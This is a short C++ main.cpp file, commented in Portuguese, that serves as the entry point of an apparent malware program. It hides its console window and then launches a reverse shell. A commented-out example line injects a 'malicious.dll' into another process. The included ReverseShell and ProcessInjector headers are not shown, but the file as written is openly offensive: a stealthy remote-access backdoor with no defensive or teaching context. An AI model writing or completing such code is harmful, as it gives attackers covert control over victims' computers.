// main.cpp
#include "SystemUtils.h"
#include "ReverseShell.h"
#include "ProcessInjector.h"
#include <stdexcept>
#include <cstdlib>

int main() {
    try {
        SystemUtils::hideConsole();
        
        // Exemplo de injeção de processo
        // ProcessInjector::inject(1234, "C:\\path\\to\\malicious.dll");
        
        ReverseShell shell;
        shell.start();
        
        return EXIT_SUCCESS;
    } 
    catch (const std::exception& e) {
        return EXIT_FAILURE;
    }
}
